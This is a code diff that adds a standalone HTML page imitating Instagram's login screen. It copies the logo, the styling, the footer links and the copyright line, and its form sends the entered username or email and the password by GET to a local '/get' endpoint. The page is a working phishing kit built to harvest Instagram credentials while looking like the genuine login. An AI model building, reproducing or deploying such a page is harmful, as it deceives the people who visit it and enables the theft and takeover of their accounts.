@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: black;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 350px;
+            margin-top: 32px;
+            margin-bottom: 32px;
+        }
+
+        .login-box {
+            background-color: black;
+            border: 1px solid #363636;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-label {
+            position: absolute;
+            left: 8px;
+            top: 2px;
+            color: #8e8e8e;
+            font-size: 10px;
+            pointer-events: none;
+            opacity: 1;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 8px 6px;
+            background: #121212;
+            border: 0.5px solid #363636;
+            border-radius: 3px;
+            font-size: 12px;
+            box-sizing: border-box;
+            color: white;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            user-select: none;
+            display: none;
+        }
+
+        .password-toggle.active {
+            display: block;
+        }
+
+        .password-toggle:hover {
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 7.5px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #262626;
+            margin: 0 18px;
+        }
+
+        .facebook-login {
+            color: #0095f6;
+            font-size: 10px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .facebook-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        .forgot-password {
+            color: #e0f1ff;
+            font-size: 14px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .report{
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+            padding: 0 20px;
+        }
+
+        a{
+            text-decoration: none;
+            color: white;
+        }
+
+        .signup-box {
+            background-color: black;
+            border: 1px solid #363636;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: white;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .footer {
+            width: 100%;
+            text-align: center;
+            margin-bottom: auto;
+            padding: 20px 0;
+            color: #8e8e8e;
+            font-size: 12px;
+            position: relative;
+            bottom: 0;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer-link {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 11px;
+            white-space: nowrap;
+            margin: 0 4px;
+        }
+
+        .copyright {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+            font-size: 11px;
+        }
+
+        select {
+            border: none;
+            color: #8e8e8e;
+            background: transparent;
+            font-size: 11px;
+            cursor: pointer;
+            padding: 2px 5px;
+        }
+
+        select:focus{
+            background: black;
+        }
+
+        @media (max-width: 450px) {
+            .login-box{
+                border: transparent;
+            }
+
+            .signup-box{
+                border: transparent;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 840 300" style="width:100%">
+                    <path
+                        d="M64.76 49.11c-16.2 6.78-34.03 25.96-39.66 50.02-7.13 30.49 22.53 43.38 24.97 39.15 2.86-4.97-5.32-6.65-7-22.47-2.18-20.43 7.32-43.26 19.28-53.28 2.22-1.86 2.12.73 2.12 5.52l-.47 101.53c0 21.72-.9 28.58-2.51 35.36-1.63 6.87-4.26 11.51-2.27 13.3 2.22 2 11.71-2.76 17.2-10.42 6.59-9.19 8.89-20.23 9.3-32.22.5-14.45.48-37.39.5-50.47l-.2-68.25c-.1-5.18-14.47-10.62-21.25-7.78m575.63 101.65c-.52 11.29-3.02 20.12-6.12 26.34-6.01 12.05-18.47 15.79-23.76-1.53-2.88-9.44-3.02-25.22-.94-38.4 2.1-13.42 8-23.56 17.76-22.65 9.62.9 14.13 13.3 13.07 36.23zM478.15 220.81c-.13 18.76-3.08 35.21-9.42 40-8.98 6.78-21.05 1.69-18.55-12 2.21-12.11 12.67-24.49 27.99-39.6l-.02 11.61zm-2.45-70.17c-.55 10.28-3.22 20.62-6.12 26.45-6.01 12.05-18.56 15.82-23.76-1.53-3.56-11.86-2.7-27.2-.94-36.87 2.28-12.54 7.82-24.18 17.76-24.18 9.66 0 14.43 10.6 13.07 36.12zm-93.98-.16c-.59 10.89-2.71 20-6.12 26.61-6.17 11.97-18.38 15.77-23.76-1.53-3.88-12.47-2.56-29.48-.94-38.66 2.4-13.63 8.39-23.3 17.76-22.38 9.62.94 14.3 13.3 13.07 35.97zM812.42 163.21c-2.35 0-3.43 2.42-4.31 6.5-3.08 14.19-6.32 17.4-10.5 17.4-4.66 0-8.85-7.03-9.93-21.09-.85-11.06-.71-31.41.37-51.66.22-4.16-.93-8.28-12.09-12.33-4.8-1.74-11.78-4.31-15.26 4.08-9.82 23.7-13.66 42.52-14.56 50.16-.05.4-.53.48-.62-.45-.58-6.12-1.86-17.25-2.02-40.62-.03-4.56-1-8.44-6.03-11.62-3.27-2.06-13.18-5.71-16.76-1.37-3.09 3.55-6.68 13.1-10.4 24.42l-5.13 15.43.08-34.24c.01-3.55-2.42-4.74-3.16-4.95-3.31-.96-9.82-2.56-12.6-2.56-3.41 0-4.25 1.91-4.25 4.69l-.54 55.29.01 3.19c-1.89 10.39-8.01 24.49-14.67 24.49-6.66 0-9.8-5.9-9.8-32.84 0-15.72.47-22.55.7-33.92l.38-12.72c-.05-3.5-6.1-5.26-8.92-5.92-2.83-.66-5.29-.91-7.21-.8-2.72.15-4.64 1.94-4.64 4.39l.02 3.81c-3.5-5.5-9.13-9.33-12.87-10.44-10.09-2.99-20.61-.34-28.55 10.77-6.31 8.83-10.11 18.82-11.6 33.19-1.09 10.5-.74 21.15 1.21 30.15-2.35 10.16-6.71 14.32-11.49 14.32-6.94 0-11.96-11.32-11.38-30.9.39-12.88 2.96-21.92 5.78-34.99 1.2-5.57.23-8.49-2.22-11.29-2.25-2.56-7.03-3.87-13.9-2.26-4.9 1.15-11.9 2.39-18.31 3.33 0 0 .39-1.54.7-4.26 1.67-14.26-13.83-13.1-18.78-8.55-2.95 2.72-4.96 5.93-5.72 11.69-1.21 9.15 6.26 13.47 6.26 13.47-2.45 11.2-8.45 25.85-14.65 36.44-3.32 5.67-5.86 9.88-9.14 14.34l-.03-4.98.38-48.8.38-12.58c-.04-2.56-1.53-3.53-4.64-4.75-2.75-1.08-6-1.83-9.37-2.09-4.26-.33-6.82 1.93-6.75 4.59.01.5.01 3.6.01 3.6-3.5-5.5-9.13-9.33-12.87-10.44-10.09-2.99-20.61-.34-28.55 10.77-6.31 8.83-10.44 21.21-11.6 33.08-1.1 11.06-.89 20.45.6 28.37-1.6 7.93-6.22 16.22-11.43 16.22-6.66 0-10.46-5.9-10.46-32.84 0-15.72.47-22.55.7-33.92l.38-12.72c-.05-3.5-6.1-5.26-8.92-5.92-2.95-.68-5.5-.93-7.44-.79-2.58.19-4.39 2.5-4.39 4.22v3.97c-3.5-5.5-9.13-9.33-12.87-10.44-10.09-2.99-20.55-.3-28.55 10.77-5.22 7.22-9.44 15.21-11.6 32.92-.63 5.12-.9 9.91-.87 14.39-2.08 12.72-11.26 27.38-18.78 27.38-4.4 0-8.58-8.53-8.58-26.7 0-24.21 1.5-58.68 1.75-62l11.33-.18c4.74-.05 9.02.06 15.33-.26 3.16-.16 6.21-11.51 2.95-12.92-1.48-.64-11.94-1.19-16.08-1.28-3.49-.08-13.19-.8-13.19-.8l1.07-25.29c.17-2.01-2.43-3.05-3.93-3.68-3.63-1.54-6.89-2.27-10.74-3.07-5.32-1.1-7.74-.02-8.21 4.47-.7 6.82-1.08 26.8-1.08 26.8-3.91 0-17.25-.76-21.16-.76-3.63 0-7.55 15.62-2.53 15.81l22.52.62-.29 49.19c-3.67 19.14-16.61 29.48-16.61 29.48 2.78-12.66-2.9-22.17-13.12-30.23-3.77-2.97-11.2-8.58-19.52-14.74 0 0 4.82-4.75 9.1-14.3 3.03-6.77 3.16-14.51-4.27-16.22-12.28-2.82-22.4 6.19-25.42 15.82-2.34 7.46-1.09 12.99 3.49 18.74.34.42.7.85 1.07 1.28-2.77 5.34-6.58 12.53-9.8 18.11-8.95 15.48-15.71 27.73-20.82 27.73-4.09 0-4.03-12.44-4.03-24.08 0-10.04.74-25.13 1.33-40.75.2-5.17-2.39-8.11-6.72-10.78-2.63-1.62-8.25-4.8-11.5-4.8-4.87 0-18.91.66-32.19 39.05-1.67 4.84-4.96 13.66-4.96 13.66l.28-46.17c0-1.08-.58-2.13-1.9-2.85-2.24-1.21-8.2-3.7-13.52-3.7-2.53 0-3.79 1.18-3.79 3.52l-.46 72.23c0 5.49.14 11.9.69 14.69 1.42 5.08 2.5 6.44 4.4 2.81 1.92.4 12.45 1.75 13-2.27.65-4.82.68-10.04 6.21-29.49 8.61-30.28 19.83-45.05 25.1-50.3.92-.92 1.98-.97 1.93.53l-1.55 37.32c-1.43 37.71 5.43 44.71 15.24 44.71 7.5 0 18.07-7.45 29.4-26.32l18.86-31.6 11.14 10.26c8.95 8.5 11.89 16.57 9.94 24.23-1.49 5.86-7.11 11.9-17.11 6.03-2.91-1.71-4.16-3.03-7.09-4.96-1.57-1.04-3.98-1.35-5.42-.26-3.74 2.82-5.88 6.41-7.11 10.86-1.19 4.32 3.14 6.61 7.63 8.6 3.87 1.72 12.18 3.28 17.47 3.46 20.65.7 37.19-9.97 48.7-37.46 2.06 23.75 10.83 37.18 26.07 37.18 10.19 0 20.4-13.17 24.87-26.13 1.28 5.28 3.18 9.87 5.63 13.76 11.74 18.6 34.52 14.6 45.97-1.2 3.54-4.88 4.08-6.64 4.08-6.64 1.67 14.92 13.68 20.13 20.56 20.13 7.7 0 15.66-3.64 21.23-16.19.65 1.36 1.37 2.66 2.15 3.9 11.74 18.6 34.52 14.6 45.97-1.2a72.9 72.9 0 0 0 1.42-2.02l.34 9.8-10.54 9.66c-17.64 16.18-31.05 28.46-32.03 42.75-1.27 18.23 13.52 25 24.7 25.89 11.88.94 22.05-5.62 28.3-14.8 5.5-8.08 9.1-25.48 8.83-42.66l-.41-25c6.2-7.2 13.18-16.3 19.61-26.95 7.01-11.6 14.52-27.19 18.36-39.32 0 0 6.53.06 13.49-.4 2.23-.15 2.87.31 2.46 1.94-.5 1.97-8.8 34-1.22 55.32 5.19 14.6 16.87 19.3 23.81 19.3 8.11 0 15.87-6.13 20.03-15.23.5 1.01 1.03 2 1.6 2.9 11.74 18.6 34.44 14.58 45.97-1.2 2.6-3.56 4.08-6.64 4.08-6.64 2.47 15.44 14.48 20.21 21.36 20.21 7.16 0 13.96-2.94 19.48-15.99.23 5.75.59 10.45 1.17 11.93.35.9 2.38 2.04 3.87 2.59 6.55 2.43 13.24 1.28 15.7.78 1.71-.35 3.05-1.72 3.23-5.27.48-9.32.18-24.97 3-36.61 4.74-19.53 9.17-27.1 11.26-30.85 1.18-2.1 2.5-2.45 2.55-.22.1 4.5.32 17.71 2.16 35.46 1.35 13.06 3.15 20.77 4.54 23.21 3.95 6.99 8.83 7.32 12.8 7.32 2.53 0 7.82-.7 7.34-5.14-.23-2.17.17-15.55 4.85-34.79 3.05-12.56 8.14-23.91 9.98-28.06.68-1.53.99-.32.98-.09-.39 8.65-1.25 36.95 2.27 52.43 4.78 20.97 18.6 23.31 23.42 23.31 10.28 0 18.69-7.82 21.52-28.4.68-4.95-.33-8.78-3.36-8.78"
+                        fill="white" />
+                </svg>
+            </div>
+            <form action="/get">
+                <div class="input-group">
+                    <label class="input-label" id="username-label">Phone number, username, or email</label>
+                    <input name="email" class="input-field" type="text" id="username" placeholder="Phone number, username, or email">
+                </div>
+                <div class="input-group">
+                    <label class="input-label" id="password-label">Password</label>
+                    <input name="password" class="input-field" type="password" id="password" placeholder="Password">
+                    <span class="password-toggle" id="togglePassword">Show</span>
+                </div>
+                <button class="login-btn" id="loginButton" type="sumbit">Log In</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <div class="facebook-login">
+                <span class="facebook-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="16" height="16">
+                    <rect width="512" height="512" fill="#0095f6" rx="15%"/>
+                    <path fill="#fff" d="M287 456V157c0-21 6-35 35-35h38V59c-7-1-29-3-55-3-54 0-91 33-91 94v306m143-254H152v72h196"/>
+                  </svg>
+                Log in with Facebook
+            </div>
+            
+            <div class="forgot-password">Forgot password?</div>
+
+            <div class="report">You can also <a href="">report content you believe is unlawful</a> in your country without logging in.</div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <span class="signup-link">Sign up</span>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Top Accounts</a>
+                <a href="#" class="footer-link">Hashtags</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+                <a href="#" class="footer-link">Meta Verified</a>
+            </div>
+            
+            <div class="copyright">
+                <select>
+                    <option>English</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+                <span>© 2025 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+const username = document.querySelector('#username');
+const password = document.querySelector('#password');
+const togglePassword = document.querySelector('#togglePassword');
+const usernameLabel = document.querySelector('#username-label');
+const passwordLabel = document.querySelector('#password-label');
+const loginButton = document.querySelector('#loginButton');
+
+username.removeAttribute('placeholder');
+password.removeAttribute('placeholder');
+
+username.addEventListener('input', updateLoginButton);
+password.addEventListener('input', updateLoginButton);
+
+togglePassword.addEventListener('click', function(e) {
+    e.preventDefault();
+    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+    password.setAttribute('type', type);
+    this.textContent = type === 'password' ? 'Show' : 'Hide';
+});
+
+function updateLoginButton() {
+
+    togglePassword.classList.toggle('active', password.value.length > 0);
+}
+
+updateLoginButton();
+    </script>
+</body>
+</html>
